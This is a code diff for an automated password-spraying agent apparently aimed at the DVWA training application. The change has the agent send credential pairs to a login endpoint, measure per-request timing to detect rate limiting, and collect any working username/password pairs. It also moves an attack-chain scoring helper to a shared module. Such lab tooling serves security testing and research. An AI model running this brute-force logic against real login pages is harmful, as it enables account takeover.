@@ -7,8 +7,7 @@ import time as time_mod
 from typing import Any
 
 from agents.agent_telemetry import exploit_event, probe_event, score_event
-from agents.state_utils import already_tried_payloads, make_update, normalize_security_level
-from core.knowledge_graph import AttackKnowledgeGraph
+from agents.state_utils import already_tried_payloads, chain_check as _chain_check, make_update, normalize_security_level
 from core.state import ExploitationState, MODULE_TO_KG_NODE
 from foundation.payload_library import PayloadLibrary
 from foundation.session_manager import DVWASession
@@ -42,35 +41,45 @@ def _probe_preconditions(
 ) -> tuple[bool, list[str], dict[str, bool], list[dict]]:
     """Send rapid requests to detect rate limiting.
 
-    Returns (precondition_met, tried_payloads, observations, telemetry_events).
+    Uses a small dedicated set of rate-test credentials so probe does not
+    consume real exploit payloads. Returns actual credential strings in
+    tried_payloads (not synthetic keys).
     """
     observations: dict[str, bool] = {}
     tried: list[str] = []
     events: list[dict] = []
     sent_any = False
+    sent_count = 0
 
+    # Use the provided payloads when present so callers control the probe set.
+    # Fall back to dedicated rate-test credentials only when no payloads exist.
+    rate_test_credentials = list(payloads) or ["rate_test:test", "probe:probe"]
     probe_start = time_mod.monotonic()
-    for i, _payload in enumerate(payloads):
-        probe_key = f"spray_probe_{i}"
-        if probe_key in already_tried:
+    for cred in rate_test_credentials:
+        if cred in already_tried:
             continue
         sent_any = True
-        tried.append(probe_key)
+        tried.append(cred)
+        sent_count += 1
+        username, password = _parse_credential(cred)
         try:
             resp = session.get(
                 MODULE_PATH,
-                params={"username": "test", "password": "test", "Login": "Login"},
+                params={"username": username, "password": password, "Login": "Login"},
             )
-            events.append(probe_event(AGENT_ID, probe_key, resp.status_code, True))
+            events.append(probe_event(AGENT_ID, cred, resp.status_code, True))
         except Exception as exc:
             logger.warning("[%s] PROBE request failed: %s", AGENT_ID, exc)
-            events.append(probe_event(AGENT_ID, probe_key, None, False))
+            events.append(probe_event(AGENT_ID, cred, None, False))
     probe_elapsed = time_mod.monotonic() - probe_start
 
     if not sent_any:
         return True, tried, {}, events  # Assume no rate limit if already probed
 
-    if probe_elapsed > _RATE_LIMIT_THRESHOLD:
+    # Normalize by request count to avoid false negatives on large probe sets
+    per_request_elapsed = probe_elapsed / max(sent_count, 1)
+    per_request_threshold = 0.7  # seconds per request
+    if per_request_elapsed > per_request_threshold:
         observations[_PROBE_OBSERVATION_KEY] = False
         return False, tried, observations, events
 
@@ -127,10 +136,6 @@ def _attempt_exploit(
                 found_credentials.append({"username": username, "password": password})
                 break
 
-            failure_result = verifier.contains_any(resp.text, _FAILURE_SIGNALS)
-            if not failure_result.ok and resp.status_code == 200:
-                # Ambiguous response - no clear signal either way
-                pass
         except Exception as exc:
             logger.warning("[%s] EXPLOIT request failed: %s", AGENT_ID, exc)
             events.append(exploit_event(AGENT_ID, payload, None, False))
@@ -139,25 +144,6 @@ def _attempt_exploit(
             time_mod.sleep(delay)
 
     return score, tried, confirmed, events, found_credentials
-
-
-def _chain_check(confirmed_node: str, state: ExploitationState) -> tuple[int, list[str]]:
-    """Query AKG for chain edges. Returns (score, achieved_outcomes)."""
-    achieved: list[str] = []
-    score = 0
-    kg = AttackKnowledgeGraph()
-    confirmed_set = set(state.get("confirmed_vulns", [])) | {confirmed_node}
-
-    for edge in kg.get_next_actions(confirmed_node):
-        if not edge.get("is_chain"):
-            continue
-        preconditions = edge.get("preconditions", [])
-        if all(p in confirmed_set for p in preconditions):
-            achieved.append(edge["target"])
-            score = 4
-
-    return score, achieved
-
 
 def bf_spray_agent(state: ExploitationState) -> dict[str, Any]:
     """Run PROBE -> EXPLOIT -> CHAIN CHECK for bf_spray."""
